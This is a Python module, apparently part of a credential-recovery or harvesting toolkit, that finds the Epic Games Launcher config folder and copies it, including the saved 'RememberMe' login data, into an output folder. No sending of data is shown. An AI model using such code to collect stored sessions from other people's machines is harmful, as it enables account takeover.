import os
import shutil

from config import ModuleManager, Constant


class EpicGamesRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "EpicGamesRecovery")
        
        self.banner(r"""
     _______         ______         _             _____                                 
    |.-----.|       (______)       (_)           (_____)                     ____  ____ 
    ||x . x||       (_)__    ____   _    ___    (_)  ___   ____   __   __   (____)(____)
    ||_.-._||       (____)  (____) (_) _(___)   (_) (___) (____) (__)_(__) (_)_(_)(_)__ 
    `--)-(--`       (_)____ (_)_(_)(_)(_)___    (_)___(_)( )_( )(_) (_) (_)(__)__  _(__)
   __[=== o]___     (______)(____) (_) (____)    (_____)  (__)_)(_) (_) (_) (____)(____)
  |:::::::::::|\            (_)                                                         
  `-=========-`()           (_)                                                                     
                                   Recovery lost Epic Games accounts
                    """)

        self.epic_folder = os.path.join(self.output_folder_user, 'applications', 'epicgames')

        if not os.path.isdir(self.epic_folder):
            os.makedirs(self.epic_folder)
        
        self.epicPath = os.path.join(Constant.userprofile_dir, "EpicGamesLauncher", "Saved", "Config", "Windows")

    def run(self) -> None:
        recovered = False
        if os.path.isdir(self.epicPath):
            loginFile = os.path.join(self.epicPath, "GameUserSettings.ini") 
            if os.path.isfile(loginFile):
                self.mdebug(f"Checking {loginFile}")
                with open(loginFile) as file:
                    contents = file.read()
                    if "[RememberMe]" in contents:
                        try:
                            for file in os.listdir(self.epicPath):
                                if os.path.isfile(os.path.join(self.epicPath, file)):
                                    shutil.copy(
                                        os.path.join(self.epicPath, file),
                                        os.path.join(self.epic_folder, file),
                                    )
                            shutil.copytree(self.epicPath, self.epic_folder, dirs_exist_ok=True)
                            recovered = True
                        except Exception:
                            pass
            else:
                self.merror(f"Unable to find {loginFile}")
        else:
            self.merror(f"Unable to find EpicGames Launcher installation at: {self.epicPath}")
        if recovered:
            self.mprint(f"Recovered Epic Games")
        else:
            self.merror(f"Unable to recover Epic Games")
